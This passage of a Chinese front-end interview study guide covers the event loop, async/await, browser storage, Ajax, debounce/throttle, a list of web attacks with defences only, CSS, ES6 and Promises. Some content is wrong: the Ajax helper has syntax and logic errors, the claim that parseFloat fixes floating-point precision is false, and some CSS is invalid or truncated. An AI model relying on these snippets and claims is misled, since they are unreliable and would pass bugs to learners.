<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9629e522bc2d4c7bb12c4fd6d35f715a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCx5Y-r5puy5aWH6aW85bmy5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767948400&amp;x-signature=VTW9eQJdc8rB62KxEMXB3sVOC0I%3D" alt="image.png" loading="lazy"/></p>
<p>它的执行机制是:</p>
<ul>
<li>执行一个宏任务，如果遇到微任务就将它放到微任务的事件队列中</li>
<li>当前宏任务执行完成后，会查看微任务的事件队列，然后将里面的所有微任务依次执行完</li>
</ul>
<h5 data-id="heading-45">async 与 await</h5>
<p>async就是用来声明一个异步方法，await是用来等待异步方法执行。</p>
<p>async函数返回一个promise对象，下面代码是等效的：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'TEST'</span>);
}
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">asyncF</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">'TEST'</span>;
}
</code></pre>
<p>正常情况下， <code>await</code> 命令后面是一个 <code>Promise</code> 对象，返回该对象的结果。如果不是 <code>Promise</code> 对象，就直接返回对应的值。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 等同于 return 123</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-number">123</span>
}
<span class="hljs-title function_">f</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i)) <span class="hljs-comment">// 123</span>
</code></pre>
<p>不管 <code>await</code> 后面跟着的是什么，<code>await</code> 都会阻塞后面的代码。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fn1</span> (){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">fn2</span>()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">2</span>) <span class="hljs-comment">// 阻塞</span>
}
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fn2</span> (){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'fn2'</span>)
}
<span class="hljs-title function_">fn1</span>()
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">3</span>)
</code></pre>
<p><code>await</code> 会阻塞下面的代码(即加入微任务队列)，上面的例子中，先执行 <code>async</code> 外面的同步代码同步代码执行完，再回到 <code>async</code>函数中，再执行之前阻塞的代码</p>
<p>输出：1，fn2,3,2</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">async1</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1'</span>)
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">async2</span>()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2'</span>)
}
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">async2</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3'</span>)
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4'</span>)
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'settimeout'</span>)
})
<span class="hljs-title function_">async1</span>()
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">resolve</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'5'</span>)
    <span class="hljs-title function_">resolve</span>()
}).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'6'</span>)
})
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'7'</span>);
<span class="hljs-comment">// 输出结果： 4 1 3 5 7 2 6 settimeout</span>
</code></pre>
<p>分析过程：</p>
<ul>
<li>1.执行整段代码，遇到 <code>console.log('4')</code>直接打印结果，输出 <code>4</code>;</li>
<li>2.遇到定时器了，它是宏任务，先放着不执行;</li>
<li>3.遇到 <code>async1()</code>，执行 <code>async1</code> 函数，先打印 <code>1 </code>，下面遇到 <code>await</code> 怎么办?先执行 <code>async2</code>，打印 <code>3</code>，然后阻塞下面代码(即加入微任务列表)，跳出去执行同步代码</li>
<li>4.跳到 <code>new Promise</code> 这里，直接执行，打印 <code>5</code>，下面遇到 <code>.then()</code>，它是微任务，放到微任务列表等待执行;</li>
<li>5.最后一行直接打印 <code>7</code> ，现在同步代码执行完了，开始执行微任务，即 <code>await</code> 下面的代码，打印 <code>2</code>;</li>
<li>6.继续执行下一个微任务，即执行 <code>then</code> 的回调，<code>6</code>;</li>
<li>7.上一个宏任务所有事都做完了，开始下一个宏任务，就是定时器，打印 <code>settimeout</code>所以最后的结果是： <code>4 1 3 5 7 2 6 settimeout</code>。</li>
</ul>
<h4 data-id="heading-46">16.JavaScript本地存储方式有哪些？区别及应用场景？</h4>
<h5 data-id="heading-47">16.1 方式</h5>
<blockquote>
<p>javaScript 本地缓存的方法主要讲述以下四种:</p>
</blockquote>
<ul>
<li>cookie</li>
<li>sessionStorage</li>
<li>localStorage</li>
<li>indexedDB</li>
</ul>
<h5 data-id="heading-48">16.1.1.cookie</h5>
<p><code>Cookie</code> ，类型为「小型文本文件」，指某些网站为了辨别用户身份而储存在用户本地终端上的数据。是为了解决 <code>HTTP</code> 无状态导致的问题。
作为一段一般不超过 4KB 的小型文本数据，它由一个名称(Name)、一个值(Value)和其它几个用于控制 <code>cookie</code> 有效期、安全性、使用范围的可选属性组成。</p>
<p>但是 <code>cookie</code> 在每次请求中都会被发送，如果不使用 <code>HTTPS</code> 并对其加密，其保存的信息很容易被窃取，导致安全风险。</p>
<h5 data-id="heading-49">16.1.2 localStorage</h5>
<ul>
<li>生命周期:持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。</li>
<li>存储的信息在同一域中是共享的。</li>
<li>当本页操作(新增、修改、删除)了 localStorage 的时候，本页面不会触发 storage 事件,但是别的页面会触发 storage 事件。</li>
<li>大小:5M(跟浏览器厂商有关系)。</li>
<li><code>localstorage</code> 本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡。</li>
<li>受同源策略的限制。</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'username'</span>,<span class="hljs-string">'你的名字'</span>);
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'username'</span>);
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">key</span>(<span class="hljs-number">0</span>) <span class="hljs-comment">// 获取第一个键名</span>
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'username'</span>);
<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">clear</span>(); <span class="hljs-comment">// 清空localStorage</span>
</code></pre>
<h5 data-id="heading-50">16.1.3 sessionStorage</h5>
<p><code>sessionStorage</code> 和 <code>localstorage</code> 使用方法基本一致，唯一不同的是生命周期，一旦页面(会话)关闭，<code>sessionStorage</code> 将会删除数据。</p>
<h5 data-id="heading-51">16.1.4 indexedDB</h5>
<p><code>indexedDB</code> 是一种低级AP，用于客户端存储大量结构化数据(包括,文件/blobs)。该API使用索引来
实现对该数据的高性能搜索。</p>
<p>虽然 <code>Web Storage</code> 对于存储较少量的数据很有用，但对于存储更大量的结构化数据来说，这种方法不太有用。</p>
<p><strong>优点:</strong></p>
<ul>
<li>储存量理论上没有上限</li>
<li>所有操作都是异步的，相比LocalStorage 同步操作性能更高，尤其是数据量较大时</li>
<li>原生支持储存 JS 的对象</li>
<li>是个正经的数据库，意味着数据库能干的事它都能干</li>
</ul>
<p><strong>缺点:</strong></p>
<ul>
<li>操作非常繁琐</li>
<li>本身有一定门槛</li>
</ul>
<h5 data-id="heading-52">区别</h5>
<ul>
<li>存储大小: <code>cookie</code> 数据大小不能超过 <code>4k</code>，<code>sessionStorage 和 localStorage</code> 虽然也有存储大小的限制，但比<code>cookie</code> 大得多，可以达到<code>5M</code>或更大。</li>
<li>有效时间: <code>localStorage</code> 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据; <code>sessionStorage</code> 数据在当前浏览器窗口关闭后自动删除; <code>cookie</code> 设置的 <code>cookie</code> 过期时间之前一直有效，即使窗口或浏览器关闭。</li>
<li>数据与服务器之间的交互方式，<code>cookie</code> 的数据会自动的传递到服务器，服务器端也可以写 <code>cookie</code> 到客户端;<code>sessionStorage 和 localStorage</code> 不会自动把数据发给服务器，仅在本地保存</li>
</ul>
<h4 data-id="heading-53">17.Ajax 原理是什么？如何实现？</h4>
<p><code>Ajax</code> 的原理简单来说通过 <code>XmlHttpRequest</code> 对象来向服务器发异步请求，从服务器获得数据，然后用 <code>JavaScript</code> 来操作 <code>DOM</code> 而更新页面。</p>
<p>简单封装一个ajax请求：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ajax</span>(<span class="hljs-params">options</span>) {
    <span class="hljs-comment">//创建XMLHttpRequest对象</span>
    <span class="hljs-keyword">const</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();
    <span class="hljs-comment">//初始化参数的内容</span>
    options = options || {};
    options.<span class="hljs-property">type</span> = (options.<span class="hljs-property">type</span> || <span class="hljs-string">'GET'</span>).<span class="hljs-title function_">toUpperCase</span>();
    options.<span class="hljs-property">dataType</span> = options.<span class="hljs-property">dataType</span> <span class="hljs-string">'json'</span>;
    <span class="hljs-keyword">const</span> params = options.<span class="hljs-property">data</span>;

    <span class="hljs-comment">// 发送请求</span>
    <span class="hljs-keyword">if</span> (options.<span class="hljs-property">type</span> === <span class="hljs-string">'GET'</span>) {
        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">'GET'</span>, options.<span class="hljs-property">url</span> + <span class="hljs-string">'?'</span> + params, <span class="hljs-literal">true</span>) xhr.<span class="hljs-title function_">send</span>(<span class="hljs-literal">null</span>)
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (options.<span class="hljs-property">type</span> === <span class="hljs-string">'POST'</span>) {
        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">'POST'</span>, options.<span class="hljs-property">url</span>, <span class="hljs-literal">true</span>) xhr.<span class="hljs-title function_">send</span>(params)
        <span class="hljs-comment">// 接收请求</span>
        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">if</span> (xhr.<span class="hljs-property">readyState</span> === <span class="hljs-number">4</span>) {
                <span class="hljs-keyword">let</span> status = xhr.<span class="hljs-property">status</span>;
                <span class="hljs-keyword">if</span> (status &gt;= <span class="hljs-number">200</span> &amp;&amp; status &lt; <span class="hljs-number">300</span>) {
                    options.<span class="hljs-property">success</span> &amp;&amp; options.<span class="hljs-title function_">success</span>(xhr.<span class="hljs-property">responseText</span>, xhr.<span class="hljs-property">responseXML</span>)
                } <span class="hljs-keyword">else</span> {
                    options.<span class="hljs-property">fail</span> &amp;&amp; options.<span class="hljs-title function_">fail</span>(status)
                }
            }
        }
    }
}

<span class="hljs-comment">// 调用</span>
<span class="hljs-title function_">ajax</span>({
    <span class="hljs-attr">type</span>: <span class="hljs-string">'post'</span>,
    <span class="hljs-attr">dataType</span>: <span class="hljs-string">'json'</span>,
    <span class="hljs-attr">data</span>: {},
    <span class="hljs-attr">url</span>: <span class="hljs-string">'https://xxxx'</span>,
    <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">valse, xml</span>){ 
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(valse)
    },
    <span class="hljs-attr">fail</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">status</span>){ 
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(status)
    }
})
</code></pre>
<h4 data-id="heading-54">18. 防抖和节流？区别？如何实现？</h4>
<ul>
<li>节流: n秒内只运行一次，若在n秒内重复触发，只有一次生效。</li>
<li>防抖: n 秒后在执行该事件，若在n秒内被重复触发，则重新计时</li>
</ul>
<p><strong>应用场景：</strong></p>
<p>防抖在连续的事件，只需触发一次回调的场景有:</p>
<ul>
<li>搜索框搜索输入。只需用户最后一次输入完，再发送请求</li>
<li>手机号、邮箱验证输入检测</li>
<li>窗口大小 resize 。只需窗口调整完成后，计算窗口大小。防止重复渲染。</li>
</ul>
<p>节流在间隔一段时间执行一次回调的场景有:</p>
<ul>
<li>滚动加载，加载更多或滚到底部监听</li>
<li>搜索框，搜索联想功能</li>
</ul>
<p><strong>节流</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">throttled</span>(<span class="hljs-params">fn, delay</span>) {
    <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">let</span> starttime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-keyword">let</span> curTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(); <span class="hljs-comment">// 当前时间</span>
        <span class="hljs-keyword">let</span> remaining = delay - (curTime - starttime); <span class="hljs-comment">// 从上一次到现在，还剩下多少多余事件</span>
        <span class="hljs-keyword">let</span> context = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 保存this指向</span>
        <span class="hljs-keyword">let</span> args = <span class="hljs-variable language_">arguments</span>; <span class="hljs-comment">// 拿到event对象</span>
        <span class="hljs-built_in">clearTimeout</span>(timer);
        <span class="hljs-keyword">if</span> (remaining &lt;= <span class="hljs-number">0</span>) {
            fn.<span class="hljs-title function_">apply</span>(context, args);
            starttime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
        } <span class="hljs-keyword">else</span> {
            timer = <span class="hljs-built_in">setTimeout</span>(fn, remaining);
        }
    }
}
</code></pre>
<p><strong>防抖</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">func, wait</span>) {
    <span class="hljs-keyword">let</span> timeout;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-keyword">let</span> context = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 保存this指向</span>
        <span class="hljs-keyword">let</span> args = <span class="hljs-variable language_">arguments</span>; <span class="hljs-comment">// 拿到event对象</span>
        <span class="hljs-built_in">clearTimeout</span>(timeout)
        timeout = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            func.<span class="hljs-title function_">apply</span>(context, args)
        }, wait);
    }
}
</code></pre>
<p><strong>如果需要立即执行防抖，可加入第三个参数</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">func, wait, immediate</span>) {
    <span class="hljs-keyword">let</span> timeout;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">let</span> context = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 保存this指向</span>
        <span class="hljs-keyword">let</span> args = <span class="hljs-variable language_">arguments</span>; <span class="hljs-comment">// 拿到event对象</span>
        <span class="hljs-keyword">if</span> (timeout) <span class="hljs-built_in">clearTimeout</span>(timeout); <span class="hljs-comment">// timeout 不为 null</span>
        <span class="hljs-keyword">if</span> (immediate) {
            <span class="hljs-keyword">let</span> callNow = !timeout; <span class="hljs-comment">// 第一次会立即执行，以后只有事件执行后才会触发</span>
            timeout = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                timeout = <span class="hljs-literal">null</span>;
            },
            wait);
            <span class="hljs-keyword">if</span> (callNow) {
                func.<span class="hljs-title function_">apply</span>(context, args)
            }
        } <span class="hljs-keyword">else</span> {
            timeout = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                func.<span class="hljs-title function_">apply</span>(context, args)
            },
            wait);
        }
    }
}
</code></pre>
<p><strong>区别</strong></p>
<blockquote>
<p>相同点</p>
<ul>
<li>都可以通过使用 setTimeout 实现</li>
<li>目的都是，降低回调执行频率。节省计算资源</li>
</ul>
</blockquote>
<blockquote>
<p>不同点</p>
<ul>
<li>函数防抖，在一段连续操作结束后，处理回调，利用clearTimeout和 setTimeout 实现。函数节流，在一段连续操作中，每一段时间只执行一次，频率较高的事件中使用来提高性能。</li>
<li>函数防抖关注一定时间连续触发的事件，只在最后执行一次，而函数节流一段时间内只执行一次例如，都设置时间频率为500ms，在2秒时间内，频繁触发函数，节流，每隔500ms 就执行一次。防抖，则不管调动多少次方法，在2s后，只会执行一次。</li>
</ul>
</blockquote>
<h4 data-id="heading-55">19. web常见的攻击方式有哪些？如何防御？</h4>
<p>常见的有：</p>
<ul>
<li>XSS 跨站脚本攻击</li>
<li>CSRF 跨站请求伪造</li>
<li>SQL 注入攻击</li>
</ul>
<p>防止csrf常用方案如下：</p>
<ul>
<li>阻止不明外域的访问，<code>同源检测，Samesite Coolkie</code>。</li>
<li>提交时要求附加本域才能获取信息 <code>CSRF Token, 双重Cookie验证</code>。</li>
</ul>
<p>预防SQL如下：</p>
<ul>
<li>严格检查输入变量的类型和格式</li>
<li>过滤和转义特殊字符</li>
<li>对访问数据库的web应用程序采用web应用防火墙</li>
</ul>
<h4 data-id="heading-56">20.JavaScript内存泄露的几种情况？</h4>
<p>内存泄漏(Memory leak)是在计算机科学中，由于疏忽或错误造成程序未能释放已经不再使用的内存。</p>
<p>Javascript 具有自动垃圾回收机制，也就是说，执行环境会负责管理代码执行过程中使用的内存。</p>
<p>常见的内存泄露情况：</p>
<ul>
<li>意外的全局变量。<code>a='我是未声明的变量'</code>.</li>
<li>定时器</li>
</ul>
<h4 data-id="heading-57">21. JavaScript数字精度丢失的问题？如何解决？</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-number">0.1</span> + <span class="hljs-number">0.2</span> === <span class="hljs-number">0.3</span>; <span class="hljs-comment">// false</span>
</code></pre>
<p>可以使用parseFloat解决</p>
<h3 data-id="heading-58">CSS题型整理</h3>
<h4 data-id="heading-59">1.盒模型</h4>
<p>盒模型：由4个部分组成，content,padding,border,margin.</p>
<h4 data-id="heading-60">2.BFC的理解</h4>
<p>BFC：即块级格式化上下文。</p>
<p>常见页面情况有：</p>
<ul>
<li>元素高度没了</li>
<li>俩栏布局没法自适应</li>
<li>元素间距奇怪</li>
</ul>
<h5 data-id="heading-61">2.1清除内部浮动</h5>
<p>元素添加<code>overflow: hidden;</code></p>
<h4 data-id="heading-62">3.元素水平垂直居中的方法有哪些？</h4>
<p>实现方式如下：</p>
<ul>
<li>利用定位+margin:auto</li>
<li>利用定位+margin: 负值</li>
<li>利用定位+transform</li>
<li>flex布局等</li>
</ul>
<h4 data-id="heading-63">4.实现两栏布局，右侧自适应？三栏布局中间自适应？</h4>
<p>两栏布局的话：</p>
<ul>
<li>使用float左浮动布局</li>
<li>右边模块使用margin-left 撑出内容块做内容展示</li>
<li>为父级元素添加BFC，防止下方元素跟上方内容重叠。</li>
</ul>
<p>flex布局：</p>
<ul>
<li>简单易用代码少</li>
</ul>
<p>三栏布局：</p>
<ul>
<li>两边用float，中间用margin</li>
<li>两边用absolute,中间用margin</li>
<li>display: table</li>
<li>flex</li>
<li>grid网格布局</li>
</ul>
<h4 data-id="heading-64">5.css中，有哪些方式隐藏页面元素？</h4>
<p>例如：</p>
<ul>
<li><code>display: none</code>; 最常用，页面彻底消失，会导致浏览器重排和重绘</li>
<li><code>visibility: hidden</code>; dom存在，不会重排，但是会重绘</li>
<li><code>opacity: 0</code>;  元素透明 元素不可见，可以响应点击事件</li>
<li><code>position: absolute</code>; 将元素移出可视区域，不影响页面布局</li>
</ul>
<h4 data-id="heading-65">6.如何实现单行/多行文本溢出的省略样式</h4>
<p><strong>单行：</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-tag">p</span> {
    <span class="hljs-attribute">overflow</span>: hidden;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;
    <span class="hljs-attribute">width</span>:<span class="hljs-number">400px</span>;
    <span class="hljs-attribute">height</span>:<span class="hljs-number">40px</span>;
    <span class="hljs-attribute">border</span>:<span class="hljs-number">1px</span> solid red;
    <span class="hljs-attribute">text-overflow</span>: ellipsis;
    <span class="hljs-attribute">white-space</span>: nowrap;
}

</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
</code></pre>
<p><strong>多行</strong></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.demo</span> {
    <span class="hljs-attribute">position</span>: relative;
    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;
    <span class="hljs-attribute">overflow</span>: hidden;
}
<span class="hljs-selector-class">.demo</span><span class="hljs-selector-pseudo">::after</span> {
    <span class="hljs-attribute">content</span>: <span class="hljs-string">"..."</span>;
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-number">0</span> <span class="hljs-number">10px</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"demo"</span>&gt;</span>文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本文本<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
</code></pre>
<p>css实现</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-tag">p</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">400px</span>;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">1px</span> solid red;
    -webkit-line-clamp: <span class="hljs-number">2</span>;
    <span class="hljs-attribute">display</span>: -webkit-box;
    -webkit-box-orient: vertical;
    <span class="hljs-attribute">overflow</span>: hidden;
    <span class="hljs-attribute">text-overflow</span>: ellipsis;
}
&lt;/styl
</span></code></pre>
<h4 data-id="heading-66">7.CSS3新增了哪些新特性？</h4>
<p>选择器：</p>
<ul>
<li><code>nth-child(n)</code></li>
<li><code>nth-last-child(n)</code></li>
<li><code>last-child</code></li>
</ul>
<p>新样式：</p>
<ul>
<li><code>border-radius</code>; 创建圆角边框</li>
<li><code>box-shadow</code>; 为元素添加阴影</li>
<li><code>border-image</code>; 图片绘制边框</li>
<li><code>background-clip</code>; 确定背景画区</li>
<li><code>background-size</code>; 调整背景图大小</li>
</ul>
<p>文字：</p>
<ul>
<li><code>word-wrap: normal|break-word</code>; 使用浏览器默认的换行 | 允许在单词内换行;</li>
<li><code>text-overflow; clip | ellipsis</code>; 修剪文本 | 显示省略符号来代表被修剪的文本;</li>
<li><code>text-decoration; text-fill-color| text-stroke-color | text-stroke-width</code>;</li>
</ul>
<p>transition 过渡、transform 转换、animatin动画、渐变、等</p>
<h4 data-id="heading-67">8.CSS提高性能的方法有哪些？</h4>
<p>如下：</p>
<ul>
<li>内联首屏关键<code>css</code></li>
<li>异步加载<code>css</code></li>
<li>资源压缩（<code>webpack/gulp/grunt</code>）压缩代码</li>
<li>合理的使用选择器</li>
<li>不要使用<code>@import</code></li>
<li><code>icon</code>图片合成等</li>
</ul>
<h3 data-id="heading-68">ES6</h3>
<h4 data-id="heading-69">1.var,let, const的区别？</h4>
<ul>
<li><code>var</code> 声明的变量会提升为全局变量，多次生成，会覆盖。</li>
<li><code>let</code> let声明的变量只在代码块内有效。</li>
<li><code>const</code> 声明一个只读常量，常量的值不能改变。</li>
</ul>
<p>区别：</p>
<ul>
<li>变量提升，<code>var</code>会提升变量到全局。<code>let, const</code>直接报错</li>
<li>暂时性死区</li>
<li>块级作用域</li>
<li>重复声明</li>
<li>修改声明的变量</li>
</ul>
<h4 data-id="heading-70">2.ES6中数组新增了哪些扩展？</h4>
<ul>
<li>扩展运算符<code>...</code></li>
<li>构造函数新增的方法 <code>Array.from(),Array.of()</code></li>
<li>数组实例新增方法有：copyWithin(),find(),findIndex(),fill(),includes(),keys(),values()等</li>
</ul>
<h4 data-id="heading-71">3.对象新增了哪些扩展</h4>
<p>对象名跟对应值名相等的时候，可以简写。
const a = {foo: foo} == const a = {foo}</p>
<p><strong>属性的遍历：</strong></p>
<ul>
<li>for...in:循环遍历对象自身的和继承的可枚举属性(不含Symbol属性)</li>
<li>Object.keys(obj):返回一个数组，包括对象自身的(不含继承的)所有可枚举属性(不含Symbol属性)的键名</li>
<li>Object.getOwnPropertyNames(obj):回一个数组，包含对象自身的所有属性(不含Symbol属性，但是包括不可枚举属性)的键名</li>
<li>Object.getOwnPropertySymbols(obj):返回一个数组，包含对象自身的所有Symbol属性的键名----- Reflect.ownKeys(obj):返回一个数组，包含对象自身的(不含继承的)所有键名，不管键名是Symbol或字符串，也不管是否可枚举.</li>
</ul>
<p><strong>对象新增的方法</strong></p>
<ul>
<li>Object.is()；</li>
<li>Object.assign()；</li>
<li>Object.getOwnPropertyDescriptors() ；</li>
<li>Object.keys(), Object.values(),Object.entries()；</li>
<li>Object.fromEntries()；</li>
</ul>
<h4 data-id="heading-72">4.理解ES6中Promise的？</h4>
<p>优点：</p>
<ul>
<li>链式操作减低了编码难度</li>
<li>代码可读性增强</li>
</ul>
<p><code>promise</code>对象仅有三种状态，<code>pending</code>(进行中)，<code>fulfilled</code>(已成功)，<code>rejected</code>(已失败)。一旦状态改变(从 <code>pending</code>变为 <code>fulfilled</code>和从 <code>pending</code>变为 <code>rejected</code>)，就不会再变，任何时候都可以得到这个结果。</p>
<p><strong>使用方法</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, reject</span>) {});
</code></pre>
<p><code>Promise</code>构造函数接受一个函数作为参数，该函数的两个参数分别是<code>resolve</code>和 <code>reject</code></p>
<ul>
<li><code>resolve</code>函数的作用是，将<code>Promise</code>对象的状态从"未完成"变为"成功"</li>
<li><code>reject</code>函数的作用是，将<code>Promise</code>对象的状态从"未完成"变为"失败"</li>
</ul>
<p>实例方法：</p>
<ul>
<li><code>then()</code> 是实例状态发生改变时的回调函数。</li>
<li><code>catch()</code> 指定发生错误时的回调函数。</li>
<li><code>finally()</code> 不管Prosime对象最后状态如何，都会执行。</li>
</ul>
<p><strong>构造函数方法</strong>
Promise构造函数存在以下方法：</p>
<ul>
<li>all() 将多个<code>Promise</code>实例包装成一个新的<code>Promise</code>实例。</li>
<li>race() 将多个<code>Promise</code>实例包装成一个新的<code>Promise</code>实例。</li>
<li>allSettled() 接受一组Promise实例作为参数，只有等所有这些参数返回结果，实例才会结束。</li>
<li>resolve() 将现有对象转为Promise对象。</li>
<li>reject() 返回一个新的Promise实例，状态为rejected。</li>
</ul>
<h3 data-id="heading-73">Vue2面试题</h3>
<h4 data-id="heading-74">1.生命周期？</h4>
<blockquote>
